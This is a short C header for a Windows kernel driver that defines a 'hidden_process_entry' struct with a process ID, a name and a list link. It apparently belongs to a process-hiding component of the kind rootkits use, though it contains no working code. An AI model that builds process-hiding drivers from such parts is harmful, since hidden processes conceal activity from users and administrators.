#ifndef process_defs_h
#define process_defs_h

#include <ntddk.h>

typedef struct _hidden_process_entry {
    ULONG pid;
    WCHAR name[260];
    LIST_ENTRY list;
} hidden_process_entry, *phidden_process_entry;

#endif
